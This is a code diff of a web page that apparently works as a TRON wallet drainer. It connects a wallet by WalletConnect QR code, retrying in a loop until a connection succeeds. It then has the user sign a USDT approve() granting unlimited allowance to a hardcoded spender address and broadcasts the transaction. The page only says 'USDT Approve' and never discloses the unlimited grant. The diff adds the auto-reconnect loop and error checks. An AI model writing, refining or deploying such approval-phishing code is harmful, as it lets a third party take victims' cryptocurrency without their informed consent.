@@ -6,21 +6,18 @@
 <title>TRON USDT Approve</title>
 
 <style>
-*{box-sizing:border-box;margin:0;padding:0}
-body{font-family:sans-serif;background:#0a0a0a;color:#e0e0e0;display:flex;justify-content:center;align-items:center;min-height:100vh}
-.card{background:#111;padding:20px;border-radius:12px;width:100%;max-width:500px}
-.step{padding:10px;margin:10px 0;background:#0d0d0d;border-left:4px solid #333}
-.step.active{border-color:#f0a500}
-.step.done{border-color:#22c55e}
-.step.error{border-color:#ef4444}
+body{font-family:sans-serif;background:#0a0a0a;color:#fff;text-align:center;padding:30px}
+.step{padding:10px;margin:10px;background:#111;border-left:4px solid #333}
+.active{border-color:#f0a500}
+.done{border-color:#22c55e}
+.error{border-color:#ef4444}
 #qr{margin-top:20px}
-pre{font-size:12px;color:#aaa;margin-top:10px}
+pre{font-size:12px;color:#aaa}
 </style>
 </head>
 
 <body>
 
-<div class="card">
 <h2>🔐 TRON USDT Approve</h2>
 
 <div id="s1" class="step">Connect Wallet</div>
@@ -31,16 +28,20 @@ pre{font-size:12px;color:#aaa;margin-top:10px}
 
 <div id="qr"></div>
 <pre id="log"></pre>
-</div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 
 <script type="module">
 const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
 const TRON_CHAIN = "tron:0x2b6653dc";
+
 const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const USDT_HEX = "41a614f803b6fd780986a42c78ec9c7f77e6ded13c";
+
 const SPENDER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
 const TRONGRID = "https://api.trongrid.io";
+
+let client, session;
 
 function step(id,state){
   document.getElementById(id).className = "step " + state;
@@ -50,7 +51,7 @@ function log(msg){
   document.getElementById("log").textContent += "\n" + msg;
 }
 
-// ✅ SAFE address conversion
+// ✅ safe address conversion
 async function toHex(addr){
   const res = await fetch(TRONGRID + "/wallet/validateaddress",{
     method:"POST",
@@ -58,26 +59,31 @@ async function toHex(addr){
     body:JSON.stringify({address:addr})
   });
   const data = await res.json();
+
+  if(!data.result){
+    throw new Error("Invalid address: " + addr);
+  }
+
   return data.hexAddress;
 }
 
-// ✅ encode approve
+// encode approve
 async function encodeApprove(spender){
-  const spenderHex = (await toHex(spender)).slice(2).padStart(64,"0");
+  const hex = (await toHex(spender)).slice(2).padStart(64,"0");
   const max = "f".repeat(64);
-  return "095ea7b3" + spenderHex + max;
+  return "095ea7b3" + hex + max;
 }
 
-// ✅ build TX (correct owner)
+// build tx
 async function buildTx(owner){
   const ownerHex = (await toHex(owner)).slice(2);
 
   const res = await fetch(TRONGRID + "/wallet/triggersmartcontract",{
     method:"POST",
     headers:{ "Content-Type":"application/json" },
-    body:JSON.stringify({
+    body: JSON.stringify({
       owner_address: ownerHex,
-      contract_address: (await toHex(USDT)).slice(2),
+      contract_address: USDT_HEX,
       function_selector:"approve(address,uint256)",
       parameter: await encodeApprove(SPENDER),
       fee_limit:100000000,
@@ -87,20 +93,26 @@ async function buildTx(owner){
   });
 
   const data = await res.json();
+
+  if(!data.transaction){
+    throw new Error("TX build failed");
+  }
+
   return data.transaction;
 }
 
-// ✅ broadcast
+// broadcast
 async function broadcast(tx){
   const res = await fetch(TRONGRID + "/wallet/broadcasttransaction",{
     method:"POST",
     headers:{ "Content-Type":"application/json" },
     body:JSON.stringify(tx)
   });
+
   return await res.json();
 }
 
-// ✅ fix signature
+// fix signature
 function fixSig(resp, tx){
   if(resp.signature){
     tx.signature = [resp.signature.replace(/^0x/,"")];
@@ -108,41 +120,57 @@ function fixSig(resp, tx){
   return tx;
 }
 
+// 🔄 AUTO QR CONNECT LOOP
+async function connectLoop(){
+  while(true){
+    try{
+      await client.disconnectAll(); // clear old sessions
+
+      const { uri, approval } = await client.connect({
+        requiredNamespaces:{
+          tron:{
+            methods:["tron_signTransaction"], // KEEP YOUR WORKING METHOD
+            chains:[TRON_CHAIN],
+            events:[]
+          }
+        }
+      });
+
+      document.getElementById("qr").innerHTML = "";
+
+      new QRCode(document.getElementById("qr"), {
+        text: uri,
+        width:200,
+        height:200
+      });
+
+      session = await approval();
+      return;
+
+    }catch(e){
+      log("QR expired → regenerating...");
+    }
+  }
+}
+
+// MAIN
 async function main(){
   try{
     step("s1","active");
 
     const { SignClient } = await import("https://esm.sh/@walletconnect/sign-client@2.17.0");
 
-    const client = await SignClient.init({
+    client = await SignClient.init({
       projectId: PROJECT_ID,
       metadata:{
-        name:"USDT Approve",
-        description:"TRON approve",
+        name:"TRON Approve",
+        description:"USDT approve",
         url:location.origin,
         icons:["https://cryptologos.cc/logos/tether-usdt-logo.png"]
       }
     });
 
-    // ✅ KEEP YOUR ORIGINAL CONNECT LOGIC
-    const { uri, approval } = await client.connect({
-      requiredNamespaces:{
-        tron:{
-          methods:["tron_signTransaction"], // keep this
-          chains:[TRON_CHAIN],
-          events:[]
-        }
-      }
-    });
-
-    // QR
-    new QRCode(document.getElementById("qr"), {
-      text: uri,
-      width: 200,
-      height: 200
-    });
-
-    const session = await approval();
+    await connectLoop();
 
     step("s1","done");
     step("s2","active");
@@ -154,7 +182,7 @@ async function main(){
     step("s3","active");
 
     const unsignedTx = await buildTx(wallet);
-    log("TX Built");
+    log("TX built");
 
     step("s3","done");
     step("s4","active");
@@ -177,7 +205,7 @@ async function main(){
 
     if(result.result){
       step("s5","done");
-      log("SUCCESS TX: " + result.txid);
+      log("SUCCESS: " + result.txid);
     }else{
       throw new Error(JSON.stringify(result));
     }
